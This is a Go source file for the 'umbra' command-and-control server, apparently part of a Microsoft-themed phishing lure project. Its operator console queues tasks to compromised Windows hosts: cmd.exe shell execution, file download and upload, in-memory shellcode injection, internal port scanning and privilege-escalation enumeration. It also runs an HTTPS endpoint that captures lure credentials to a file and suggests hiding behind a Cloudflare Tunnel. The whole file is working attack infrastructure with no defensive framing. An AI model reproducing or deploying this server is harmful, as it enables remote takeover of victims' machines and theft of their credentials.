// Command server is the umbra C2 server. It speaks the same encrypted
// AES-256-GCM envelope as the beacon over HTTPS, tracks check-ins, queues
// operator tasks and prints their results. Tasking is driven either from the
// interactive console on stdin or programmatically via the task queue.
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/nullbyter19/umbra-microsoft-lure/c2/proto"
)

// taskList collects repeatable -task "op:arg" flags.
type taskList []proto.Task

func (t *taskList) String() string { return "" }

func (t *taskList) Set(v string) error {
	op, arg, _ := strings.Cut(v, ":")
	op = strings.TrimSpace(op)
	if op == "" {
		return fmt.Errorf("empty op in %q", v)
	}
	*t = append(*t, proto.Task{Op: op, Arg: strings.TrimSpace(arg)})
	return nil
}

func main() {
	listen := flag.String("listen", "0.0.0.0:8443", "listen address")
	pass := flag.String("pass", "change-me-passphrase", "shared passphrase with the beacon")
	path := flag.String("path", "/updates/v2/sync", "beacon endpoint path")
	certdir := flag.String("certdir", "c2data", "directory for the TLS cert/key")
	auth := flag.String("auth", "/updates/v2/auth", "lure credential-capture endpoint path")
	creds := flag.String("creds", "", "credential-capture JSONL file (default <certdir>/creds.jsonl)")
	var auto taskList
	flag.Var(&auto, "task", "task to hand a beacon on its first check-in, as op:arg (repeatable)")
	flag.Parse()

	for i := range auto {
		auto[i].TID = fmt.Sprintf("auto-%d", i+1)
	}

	credsFile := *creds
	if credsFile == "" {
		credsFile = filepath.Join(*certdir, "creds.jsonl")
	}

	key := proto.Key(*pass)
	h := newHub(credsFile)

	mux := newRouter(&c2Handler{key: key, hub: h, path: *path, auto: auto}, *path,
		&credsHandler{path: credsFile, hub: h}, *auth)

	cert, fp, err := loadOrCreateCert(*certdir)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-] cert:", err)
		os.Exit(1)
	}

	ln, err := net.Listen("tcp", *listen)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-] listen:", err)
		os.Exit(1)
	}
	srv := newServer(mux, cert)

	fmt.Println("umbra C2 server")
	fmt.Printf("  endpoint    : https://%s%s\n", *listen, *path)
	fmt.Printf("  cert sha256 : %s\n", colonFingerprint(fp))
	fmt.Println("  pin note    : the sha256 above is the ORIGIN self-signed certificate.")
	fmt.Println("                Pin it (cmd/pack -pin) ONLY if the beacon reaches this")
	fmt.Println("                server directly. Through a Cloudflare Tunnel the edge")
	fmt.Println("                presents Cloudflare's certificate, so pinning the origin")
	fmt.Println("                fingerprint breaks every check-in - leave -pin empty.")
	fmt.Printf("                (origin fingerprint: %s)\n", fp)
	fmt.Println("  type 'help' for the operator console")

	go func() {
		if err := srv.ServeTLS(ln, "", ""); err != nil {
			fmt.Fprintln(os.Stderr, "[-] serve:", err)
		}
	}()

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	go func() {
		console(h)
	}()

	<-stop
	fmt.Println("\n[*] shutting down")
	srv.Close()
}

// console reads operator commands from stdin until EOF.
func console(h *hub) {
	sc := bufio.NewScanner(os.Stdin)
	sc.Buffer(make([]byte, 0, 64*1024), 8<<20)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		handleCommand(h, line)
	}
}

func handleCommand(h *hub, line string) {
	fields := strings.Fields(line)
	cmd := strings.ToLower(fields[0])
	args := fields[1:]

	need := func(n int) bool {
		if len(args) < n {
			fmt.Printf("[!] usage: %s needs %d argument(s)\n", cmd, n)
			return false
		}
		return true
	}

	switch cmd {
	case "help", "?":
		fmt.Print(`commands:
  list                                  show known beacons
  shell <id> <command...>               run a command via cmd.exe /c
  download <id> <remote-path>           fetch a file (base64 result)
  upload <id> <local-path> <remote>     push a file to the beacon
  inject <id> <hex-file>                execute shellcode in memory (umbra)
  portscan <id> <hosts> [ports] [ms] [threads]  concurrent TCP scan (hosts: ip,cidr; ports: 22,80,1-1024)
  priv <id> [check]                      local privilege-escalation enumeration
  sleep <id> <seconds>                   change the beacon's sleep interval
  kill <id>                              terminate the beacon
  results <id>                           show the archive of collected results
  creds                                  show captured lure credentials
  help                                   this text

priv checks: identity privs groups uac install services autologon autoruns tasks patches network env drives all
`)
	case "list":
		bs := h.list()
		if len(bs) == 0 {
			fmt.Println("(no beacons yet)")
			return
		}
		fmt.Printf("%-18s %-16s %-16s %-10s %-6s %s\n", "ID", "HOST", "USER", "OS/ARCH", "PID", "LAST SEEN")
		for _, b := range bs {
			fmt.Printf("%-18s %-16s %-16s %-10s %-6d %s\n",
				b.ID, b.Host.Hostname, b.Host.User,
				b.Host.OS+"/"+b.Host.Arch, b.Host.PID,
				time.Since(b.Last).Round(time.Second))
		}
	case "shell":
		if !need(2) {
			return
		}
		queue(h, args[0], proto.OpShell, strings.Join(args[1:], " "))
	case "download":
		if !need(2) {
			return
		}
		queue(h, args[0], proto.OpDownload, args[1])
	case "upload":
		if !need(3) {
			return
		}
		data, err := os.ReadFile(args[1])
		if err != nil {
			fmt.Println("[!]", err)
			return
		}
		blob, _ := json.Marshal(proto.UploadArg{Path: args[2], Data: base64.StdEncoding.EncodeToString(data)})
		queue(h, args[0], proto.OpUpload, string(blob))
	case "inject":
		if !need(2) {
			return
		}
		raw, err := os.ReadFile(args[1])
		if err != nil {
			fmt.Println("[!]", err)
			return
		}
		queue(h, args[0], proto.OpInject, strings.TrimSpace(string(raw)))
	case "portscan":
		if !need(2) {
			return
		}
		sa := proto.PortScanArg{Hosts: args[1]}
		if len(args) > 2 {
			sa.Ports = args[2]
		}
		if len(args) > 3 {
			if n, err := strconv.Atoi(args[3]); err == nil {
				sa.Timeout = n
			}
		}
		if len(args) > 4 {
			if n, err := strconv.Atoi(args[4]); err == nil {
				sa.Threads = n
			}
		}
		blob, _ := json.Marshal(sa)
		queue(h, args[0], proto.OpPortScan, string(blob))
	case "priv":
		if !need(1) {
			return
		}
		check := ""
		if len(args) > 1 {
			check = args[1]
		}
		queue(h, args[0], proto.OpPriv, check)
	case "sleep":
		if !need(2) {
			return
		}
		queue(h, args[0], proto.OpSleep, args[1])
	case "kill":
		if !need(1) {
			return
		}
		queue(h, args[0], proto.OpExit, "")
	case "results":
		if !need(1) {
			return
		}
		for _, b := range h.list() {
			if b.ID != args[0] {
				continue
			}
			if len(b.results) == 0 {
				fmt.Println("(no results)")
				return
			}
			for _, r := range b.results {
				fmt.Printf("=== %s ok=%v ===\n%s\n", r.TID, r.OK, indent(r.Out))
			}
		}
	case "creds":
		printCreds(h.credsPath)
	default:
		fmt.Printf("[!] unknown command %q (try: help)\n", cmd)
	}
}

func queue(h *hub, id, op, arg string) {
	t, err := h.enqueue(id, op, arg)
	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	fmt.Printf("[*] queued %s %s for %s\n", t.TID, op, id)
}
